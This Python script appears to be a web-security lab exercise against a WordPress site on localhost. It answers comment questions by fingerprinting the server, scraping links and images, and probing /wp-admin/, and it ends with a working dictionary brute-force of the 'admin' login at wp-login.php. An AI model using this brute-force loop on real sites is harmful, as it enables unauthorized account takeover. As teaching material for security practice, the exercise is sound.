# Author: Ry
# Date: Sun Dec 12, 2021

import requests
from bs4 import BeautifulSoup

# Check if web portal is up by using GET request
resp = requests.get("http://localhost")
print(resp)

# Which server software is being used?
resp = requests.get("http://localhost")
print(resp.headers.get('server'))

# Print response headers of the GET response
resp = requests.get('http://localhost')
print(resp.headers)

# Get text content of localhost homepage. Also, can you tell which CMS is running on localhost?
resp = requests.get('http://localhost')
print(resp.text)

# Print the response in a pretty form using Beautiful Soup
resp = requests.get('http://localhost')
soup = BeautifulSoup(resp.text, 'html.parser')
print(soup.prettify)

# Print the title of web portal hosted on localhost?
print(soup.title.string)

# Print the URLs for images present on the homepage
img_tags = soup.find_all('img')
urls = [img['src'] for img in img_tags]
print(urls)

# Scrape all URLs from the home page of localhost and print unique URLs
resp = requests.get("http://localhost")
soup = BeautifulSoup(resp.content,"html.parser")
anchor_list = [a['href'] for a in soup.find_all('a', href=True) if a.text.strip()]

anchor_set = set(anchor_list)

for link in anchor_set:
    print(link)

# Can you access the admin section (/wp-admin/) of the CMS?
resp = requests.get('http://localhost/wp-admin/')
soup = BeautifulSoup(resp.text, 'html.parser')
print(soup.prettify())

# Bruteforce the wordpress login for user "admin". Use the given dictionary.
password_dict="password_dictionary.txt"

# Loading the password dictionary and Striping \n
lines = [line.rstrip('\n') for line in open(password_dict)]

for password in lines:
    print("Trying with password: ",password)
    resp = requests.post('http://localhost/wp-login.php', data = {'log':'admin', 'pwd': password })
    if "ERROR" not in resp.text:
        print("Login successful with password: ",password)
        break

print(resp.text)
